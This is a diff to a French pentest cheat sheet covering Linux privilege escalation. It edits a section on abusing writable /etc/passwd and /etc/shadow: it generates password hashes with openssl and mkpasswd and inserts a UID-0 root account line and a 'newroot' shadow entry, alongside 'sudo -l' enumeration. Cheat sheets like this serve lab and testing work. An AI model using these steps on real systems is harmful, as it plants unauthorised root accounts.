@@ -383,18 +383,21 @@ Commentary form (XSS)
 ```bash
 sudo -l (certains fichiers sont peut être modifiables ? $PATH ? Verify owner)
 ```
-#### /etc/passwd
+####/etc/passwd
 - Droits sur /etc/passwd 
 ```bash
 openssl passwd newpasswordhere
 ```
-test:x:0:0:root:/root:/bin/bash  
+```test:x:0:0:root:/root:/bin/bash```  
 ### /etc/shadow
 Droits sur /etc/shadow (hash pour "hashcat")
 ```bash
 mkpasswd -m sha-512 newpasswordhere
 ```
-user:$6$K9AELjcE4suxukCp$vNLveaks59l46HZOT5TCaxMa1xI6agxYmAFE9CMWCY9/LtBWhzlKM6k4ivhCCntbtFB/Exh3SifcOP9UZ2SIS.:19328:0:99999:7:::
+Le resultat doit être comme suit : 
+```
+newroot:$6$K9AELjcE4suxukCp$vNLveaks59l46HZOT5TCaxMa1xI6agxYmAFE9CMWCY9/LtBWhzlKM6k4ivhCCntbtFB/Exh3SifcOP9UZ2SIS.:19328:0:99999:7:::
+```
 ### /etc/sudoers
 ```bash 
 sudo -l 
